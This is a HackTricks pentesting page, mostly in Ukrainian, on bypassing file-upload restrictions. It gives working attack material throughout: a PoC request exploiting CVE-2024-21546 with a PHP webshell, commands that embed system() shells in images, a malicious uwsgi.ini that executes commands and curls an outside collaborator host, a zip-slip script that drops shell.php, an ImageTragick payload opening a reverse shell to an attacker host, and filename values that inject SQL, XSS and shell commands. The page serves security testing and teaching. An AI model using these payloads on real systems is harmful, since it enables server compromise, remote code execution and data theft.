# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо застосовується, **перевірте** **попередні розширення.** Також протестуйте їх, використовуючи великі літери: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання дійсного розширення перед** виконуваним розширенням (також використовуйте попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Ви можете використати Burp для **перебору** всіх **ascii** та **Unicode** символів. (_Зауважте, що також можна спробувати використати **раніше** згадані **розширення**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обманувши парсер розширень** на сервері за допомогою технік, таких як **подвоєння** **розширення** або **додавання сміттєвих** даних (**null** байтів) між розширеннями. _Ви також можете використати **попередні розширення**, щоб підготувати кращий payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте поставити **виконавче розширення перед дійсним розширенням** і сподівайтеся, що сервер неправильно налаштований. (корисно для експлуатації неправильних налаштувань Apache, де будь-який файл з розширенням **.php**, але не обов'язково який закінчується на .php, буде виконувати код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** в **Windows**. У цьому випадку після забороненого розширення та перед дозволеним буде вставлено символ двокрапки ":”. Як результат, на сервері буде створено **порожній файл із забороненим розширенням** (наприклад "file.asax:.jpg”). Цей файл може бути відредагований пізніше за допомогою інших технік, таких як використання короткого імені файлу. Шаблон "**::$data**” також можна використати для створення не-порожніх файлів. Тому додавання крапки після цього шаблону також може бути корисним для обходу додаткових обмежень (наприклад "file.asp::$data.”)
8. Спробуйте перевантажити ліміти імені файлу. Дійсне розширення буде обрізано. І зловмисний PHP залишиться. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Деякі upload handlers обрізають або нормалізують кінцеві крапки в збереженому імені файлу. У UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) версіях до 2.9.1 можна обійти валідацію розширення шляхом:

- Використання дійсного image MIME та magic header (наприклад, PNG’s `\x89PNG\r\n\x1a\n`).
- Іменування завантажуваного файлу з PHP-розширенням, за яким слідує крапка, наприклад, `shell.php.`.
- Сервер обрізає кінцеву крапку і зберігає `shell.php`, який буде виконаний, якщо його розмістити в веб-доступному каталозі (за замовчуванням public storage, наприклад `/storage/files/`).

Мінімальний PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Потім зверніться до збереженого шляху (типово для Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Заходи захисту:
- Оновіть unisharp/laravel-filemanager до ≥ 2.9.1.
- Запровадьте суворі серверні списки дозволених (allowlists) та повторно перевіряйте збережене ім'я файлу.
- Зберігайте завантаження в директоріях, де виконання не дозволене.

### Обхід Content-Type, magic number, стиснення та зміни розміру

- Обійдіть перевірки **Content-Type**, встановивши **значення** **заголовка** **Content-Type** на: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійдіть перевірку **magic number**, додавши на початок файлу **байти реального зображення** (заплутати команду _file_). Або вставте shell у **метадані**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або ви також можете **ввести payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення додається **стискання**, наприклад за допомогою стандартних PHP-бібліотек як [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки можуть бути марними. Однак ви можете використати **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) щоб вставити текст, який **виживе після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **змінювати розмір** зображення, використовуючи, наприклад, функції PHP-GD `imagecopyresized` або `imagecopyresampled`. Проте ви можете використати **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) щоб вставити текст, який **виживе після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload, який **виживає при зміні розміру зображення**, використовує функцію PHP-GD `thumbnailImage`. Проте ви можете використати **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) щоб вставити текст, який **виживе після стиснення**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Інші трюки для перевірки

- Знайдіть вразливість, яка дозволяє **перейменувати** вже завантажений файл (щоб змінити розширення).
- Знайдіть вразливість **Local File Inclusion** щоб виконати бекдор.
- **Можливе розкриття інформації**:
1. Завантажте **кілька разів** (і одночасно) **той самий файл** з **тим самим іменем**
2. Завантажте файл з **іменем** файлу або папки, яка **вже існує**
3. Завантаження файлу з іменем **"." , ".." або "..."**. Наприклад, в Apache на **Windows**, якщо додаток зберігає завантажені файли в "/www/uploads/" директорії, файл з ім'ям "." створить файл під назвою "uploads" у директорії "/www/".
4. Завантажте файл, який важко видалити, наприклад **"…:.jpg"** в **NTFS**. (Windows)
5. Завантажте файл у **Windows** з **недопустимими символами**, такими як `|<>*?"` у його імені. (Windows)
6. Завантажте файл у **Windows**, використовуючи **зарезервовані** (**заборонені**) імена, такі як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, і LPT9.
- Спробуйте також **завантажити виконуваний файл** (.exe) або **.html** (менш підозріле), який **буде виконувати код** при випадковому відкритті жертвою.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

Якщо ви можете завантажити XML-файл на Jetty server, ви можете отримати [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Тому, як зазначено на зображенні, завантажте XML-файл до `$JETTY_BASE/webapps/` та очікуйте shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Розглянемо наступний приклад шкідливого `uwsgi.ini` файлу, який демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час розбору файлу конфігурації. Щоб конфігурація активувалася й була розпарсена, процес uWSGI має бути перезапущений (наприклад, після збою або через Denial of Service attack) або файл має бути налаштований на auto-reload. Функція auto-reload, якщо ввімкнена, перезавантажує файл через задані інтервали при виявленні змін.

Важливо розуміти поблажливість парсингу конфігураційних файлів uWSGI. Зокрема, обговорюваний payload можна вставити в двійковий файл (наприклад, зображення або PDF), що ще більше розширює можливі вектори експлуатації.

## **wget File Upload/SSRF Trick**

Інколи можна виявити, що сервер використовує **`wget`** для **завантаження файлів** і ви можете **вказати** **URL**. У таких випадках код може перевіряти, чи розширення завантажуваних файлів знаходиться в білому списку, щоб гарантувати, що будуть завантажені лише дозволені файли. Однак, **цю перевірку можна обійти.**\
Максимальна довжина **filename** в **linux** — **255**, проте **wget** обрізає назви файлів до **236** символів. Ви можете **завантажити файл з назвою "A"\*232+".php"+".gif"**, ця назва файлу **обійде** **перевірку** (оскільки в цьому прикладі **".gif"** — **valid** розширення), але `wget` **перейменує** файл на **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, призначений допомогти Pentesters and Bug Hunters у тестуванні механізмів завантаження файлів. Він використовує різні bug bounty techniques для спрощення процесу виявлення та експлуатації вразливостей, забезпечуючи всебічну оцінку web applications.

### Corrupting upload indices with snprintf quirks (historical)

Деякі застарілі upload-хендлери, що використовують `snprintf()` або подібні функції для побудови масивів multi-file з однофайлового upload, можуть бути обмануті та змусити підробити структуру `_FILES`. Через невідповідності та усікання в поведінці `snprintf()`, ретельно сформований одиночний upload може виглядати як кілька індексованих файлів на стороні сервера, плутаючи логіку, яка очікує чіткої структури (наприклад, трактуючи це як multi-file upload і переходячи до небезпечних гілок). Хоча сьогодні це нішеве явище, цей патерн «index corruption» час від часу з'являється в CTFs та старих кодових базах.

## Від File upload до інших вразливостей

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Магічні заголовкові байти

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

Якщо ви можете завантажити ZIP, який буде розпакований на сервері, ви можете зробити 2 речі:

### Symlink
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпаковка в різні папки

Несподіване створення файлів у директоріях під час розпаковування — суттєва проблема. Незважаючи на початкові припущення, що така конфігурація може захищати від OS-level command execution через шкідливі file uploads, підтримка ієрархічної компресії та можливості directory traversal у ZIP archive format можуть бути використані. Це дозволяє нападникам обійти обмеження та вийти з secure upload directories, маніпулюючи decompression функціоналом цільового додатка.

Автоматизований експлойт для створення таких файлів доступний за адресою [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утиліту можна використовувати, як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Крім того, доступним варіантом є **symlink trick with evilarc**. Якщо метою є націлитися на файл на кшталт `/flag.txt`, слід створити symlink на цей файл у вашій системі. Це гарантує, що evilarc не стикатиметься з помилками під час роботи.

Нижче наведено приклад коду на Python, що використовується для створення шкідливого zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для file spraying**

Для детальнішої інформації **перегляньте оригінальний пост за адресою**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-код, який виконує команди, передані через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Створюється кілька файлів і збирається zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Імена файлів усередині zip змінюються за допомогою vi або hex editor, замінюючи "xxA" на "../" для обходу директорій.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати вразливість **(ImageMagick , 7.0.1-1)** (з [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP Shell у PNG

Вбудовування PHP shell у IDAT chunk PNG-файлу може ефективно обійти певні операції обробки зображень. Функції `imagecopyresized` і `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки їх часто використовують для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP shell залишатися незмінним після цих операцій є значною перевагою в певних випадках використання.

Детальний розгляд цієї техніки, включно з методологією та можливими застосуваннями, наведено у статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Це джерело дає всебічне розуміння процесу та його наслідків.

Детальніше: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files виступають унікальним інструментом у cybersecurity, поводячись як хамелеони, які можуть одночасно коректно існувати в кількох файлових форматах. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar) — гібрид, що одночасно функціонує як GIF і RAR-архів. Такі файли не обмежуються цією комбінацією; можливі й поєднання типу GIF і JS або PPT і JS.

Основна користь polyglot files полягає в їхній здатності обходити заходи безпеки, які перевіряють файли за типом. Звичайна практика в різних додатках — дозволяти для завантаження лише певні типи файлів, наприклад JPEG, GIF або DOC, щоб зменшити ризик від потенційно небезпечних форматів (наприклад, JS, PHP або Phar). Однак polyglot, відповідаючи структурним критеріям кількох форматів одночасно, може непомітно обійти ці обмеження.

Незважаючи на адаптивність, polyglots мають обмеження. Наприклад, хоча polyglot може одночасно містити PHAR file (PHp ARchive) і JPEG, успішність його завантаження може залежати від політики платформи щодо розширень файлів. Якщо система суворо контролює дозволені розширення, сама лише структурна подвійність polyglot може не гарантувати успіху завантаження.

Детальніше: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Як уникнути виявлення типу файлу, завантаживши валідний JSON, навіть якщо це не дозволено, підробивши PDF (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки магічні байти `%PDF` знаходяться в перших 1024 байтах — файл вважається валідним (приклад у пості)
- **`pdflib` library**: Додати фейковий PDF формат всередину поля JSON, щоб бібліотека вважала його PDF (приклад у пості)
- **`file` binary**: Він читає до 1048576 байтів з файлу. Просто створіть JSON більший за це, щоб утиліта не змогла розпарсити вміст як JSON, а всередині JSON розмістіть початкову частину реального PDF — і вона подумає, що це PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
